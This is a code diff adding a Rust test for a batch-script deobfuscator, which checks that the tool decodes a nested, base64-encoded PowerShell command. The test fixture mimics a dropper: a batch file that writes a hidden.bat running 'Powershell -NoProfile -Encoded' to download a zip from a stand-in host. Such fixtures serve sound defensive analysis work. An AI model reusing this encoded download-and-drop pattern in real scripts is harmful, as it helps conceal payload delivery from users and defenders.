@@ -548,6 +548,45 @@ fn summarize_lolbas_enrichment_ignores_program_names_in_non_exec_operands() {
 }
 
 #[test]
+fn analyze_recurses_into_echoed_encoded_powershell_batch() {
+    use base64::Engine;
+
+    let decoded = "Invoke-WebRequest -Uri https://recursive.example/m2.zip";
+    let utf16: Vec<u8> = decoded
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        format!(
+            "@echo off\r\necho @echo off>hidden.bat\r\necho Powershell -NoProfile -Encoded {b64}>>hidden.bat\r\n"
+        ),
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        stdout.contains("https://recursive.example/m2.zip"),
+        "stdout:\n{}",
+        stdout
+    );
+}
+
+#[test]
 fn analyze_can_enrich_lolbas_matches_from_external_json() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
